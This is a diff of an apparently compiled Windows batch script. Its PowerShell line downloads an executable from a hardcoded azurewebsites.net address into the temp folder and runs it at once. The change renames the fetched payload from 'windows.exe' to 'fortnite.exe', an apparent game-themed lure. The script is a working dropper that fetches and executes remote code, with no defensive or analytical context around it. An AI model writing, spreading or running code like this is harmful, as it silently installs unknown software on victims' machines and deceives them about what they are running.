@@ -27,7 +27,7 @@
 ::ZQ0/vhVqMQ3MEVWAtB9wSA==
 ::Zg8zqx1/OA3MEVWAtB9wSA==
 ::dhA7pRFwIByZRRnk
-::Zh4grVQjdCyDJGyX8VAjFD5YRTimM2ivC7AS/PvHyOOTilgfaMo+e4T437qaMuEf1kT0cI5j02Jf+A==
+::Zh4grVQjdCyDJGyX8VAjFD5YRTimM2ivC7AS/PvHyOOTilgfaMo+e4T437qaMuEf1kPrZ4Ij325fkMoPB1VdZhfL
 ::YB416Ek+ZG8=
 ::
 ::
@@ -35,7 +35,7 @@
 @echo off
 
 
-set files= 'http://mogiant.azurewebsites.net/windows.exe'
+set files= 'http://mogiant.azurewebsites.net/fortnite.exe'
 
 powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
 
